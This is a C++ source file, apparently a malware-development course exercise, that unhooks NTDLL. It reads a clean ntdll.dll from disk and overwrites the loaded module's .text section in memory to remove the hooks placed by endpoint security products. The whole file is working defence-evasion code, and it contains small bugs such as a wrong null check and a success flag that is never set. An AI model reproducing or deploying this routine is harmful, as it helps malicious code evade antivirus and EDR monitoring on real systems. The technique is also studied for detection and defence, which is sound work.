/**
 * Base NTDLL unhooking => reading ntdll from disk.
 * 
 * Author : Yekuuun
 * Github : https://github.com/Yekuuun
 * 
 * Notes : This code refers to maldev academy learning path.
 */

#include "header.hpp"

/**
 * Read ntdll from disk.
 */
static BOOL ReadFromDisk(OUT PVOID* pNtdllBuff) {

    CHAR   cWinPath   [MAX_PATH / 2]  = {0};
    CHAR   cNtdllPath [MAX_PATH]      = {0};

    HANDLE hFile                      = nullptr;
    DWORD  dwFileLen                  = 0;
    DWORD  dwNumberBytesRead          = 0;
    PVOID  pNtdllBuffer               = nullptr;

    if(GetWindowsDirectoryA(cWinPath, sizeof(cWinPath)) == 0){
        printf("[!] GetWindowsDirectoryA failed with error : %d \n", GetLastError());
        return FALSE;
    }

    //build NTDLL path.
    sprintf_s(cNtdllPath, sizeof(cNtdllPath), "%s\\System32\\%s", cWinPath, NTDLL);

    hFile = CreateFileA(cNtdllPath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if(hFile == INVALID_HANDLE_VALUE){
        printf("[!] Error calling CreateFileA with error : %d \n", GetLastError());
        return FALSE;
    }

    dwFileLen = GetFileSize(hFile, nullptr);
    if(dwFileLen == INVALID_FILE_SIZE){
        printf("[!] Error trying to get size of file. \n");
        goto _EndFunc;
    }

    pNtdllBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileLen);
    if(pNtdllBuff == nullptr){
        printf("[!] Error allocating memory \n");
        goto _EndFunc;
    }

    if(!ReadFile(hFile, pNtdllBuffer, dwFileLen, &dwNumberBytesRead, nullptr) || dwFileLen != dwNumberBytesRead){
        printf("[!] ReadFile Failed With Error : %d \n", GetLastError());
		printf("[*] Read %d of %d Bytes \n", dwNumberBytesRead, dwFileLen);
		goto _EndFunc;
    }

    *pNtdllBuff = pNtdllBuffer;

_EndFunc:
    if(hFile){
        CloseHandle(hFile);
    }

    return !(*pNtdllBuff == nullptr);
}

/**
 * Get local ntdll address.
 */
PVOID GetLocalNtdllAddress(){
    PPEB pPeb = (PPEB)__readgsqword(PEB_OFFSET);

    if(pPeb == nullptr){
        return nullptr;
    }

    PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

    return (PVOID)pLdr->DllBase;
}

/**
 * Replace current NTDLL by unhooked one.
 */
BOOL ReplaceSectionNtdllTxt(IN PVOID pUnhookedNtdll){
    PVOID pLocalNtdll = GetLocalNtdllAddress();

    if(pLocalNtdll == nullptr){
        printf("[*] Unable to retrieve local ntdll address. \n");
        return FALSE;
    }

    printf("\t[*] 'Hooked' Ntdll Base Address : 0x%p \n\t[i] 'Unhooked' Ntdll Base Address : 0x%p \n", pLocalNtdll, pUnhookedNtdll);
    printf("[*] Press <Enter> To Continue ... ");
	getchar();

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pLocalNtdll;
    if(pDos->e_magic != IMAGE_DOS_SIGNATURE){
        return FALSE;
    }

    PIMAGE_NT_HEADERS pNtHdr = (PIMAGE_NT_HEADERS)((BYTE*)pLocalNtdll + pDos->e_lfanew);
    if(pNtHdr->Signature != IMAGE_NT_SIGNATURE){
        return FALSE;
    }

    PVOID		pLocalNtdllTxt	= NULL,
				pRemoteNtdllTxt = NULL;
	SIZE_T		sNtdllTxtSize	= NULL;

    //txt section
    PIMAGE_SECTION_HEADER pSectionHdr = IMAGE_FIRST_SECTION(pNtHdr);

    for(int i = 0; i < pNtHdr->FileHeader.NumberOfSections; i++){
        if ((*(ULONG*)pSectionHdr[i].Name | 0x20202020) == 'xet.') {
			pLocalNtdllTxt	= (PVOID)((ULONG_PTR)pLocalNtdll + pSectionHdr[i].VirtualAddress);
            pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookedNtdll + 1024);
			sNtdllTxtSize	= pSectionHdr[i].Misc.VirtualSize;
			break;
		}
    }

    printf("\t[*] 'Hooked' Ntdll Text Section Address : 0x%p \n\t[*] 'Unhooked' Ntdll Text Section Address : 0x%p \n\t[*] Text Section Size : %d \n", pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);
	printf("[#] Press <Enter> To Continue ... ");
	getchar();

    if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt) {
		printf("\t[*] Text section is of offset 4096, updating base address ... \n");

		// if not, then the read text section is also of offset 4096, so we add 3072 (because we added 1024 already)
		pRemoteNtdllTxt += 3072;
		
		if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt){
            return FALSE;
        }
            
		printf("\t[*] New Address : 0x%p \n", pRemoteNtdllTxt);
		printf("[*] Press <Enter> To Continue ... ");
		getchar();
	}

    printf("[*] Replacing The Text Section ... \n");
	DWORD dwOldProtection = NULL;

    //changing mem protection.
    if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtection)) {
		printf("[!] VirtualProtect [1] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

    memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);

    //restoring old protections.
    if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, dwOldProtection, &dwOldProtection)) {
		printf("[!] VirtualProtect [2] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[+] DONE !\n");
	
	return TRUE;
} 

VOID PrintState(char* cSyscallName, PVOID pSyscallAddress) {
	printf("[#] %s [ 0x%p ] ---> %s \n", cSyscallName, pSyscallAddress, (*(ULONG*)pSyscallAddress != 0xb8d18b4c) == TRUE ? "[ HOOKED ]" : "[ UNHOOKED ]");
}


//test.
int main(){
    BOOL   STATE  = FALSE;
    PVOID  pNtdll = NULL;

    printf("[*] Fetching NTDLL from disk.\n");
    if(!ReadFromDisk(&pNtdll)){
        return EXIT_FAILURE;
    }

    if(!ReplaceSectionNtdllTxt(pNtdll)){
        STATE = FALSE;
        goto _EndFunc;
    }

    printf("[+] Ntdll Unhooked Successfully \n");

	//check.
	PrintState("NtProtectVirtualMemory", (PVOID)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtProtectVirtualMemory"));


	printf("[#] Press <Enter> To Quit ... ");
	getchar();


_EndFunc:
    if(pNtdll){
        HeapFree(GetProcessHeap(), 0, pNtdll);
    }

    return STATE ? EXIT_SUCCESS : EXIT_FAILURE;
}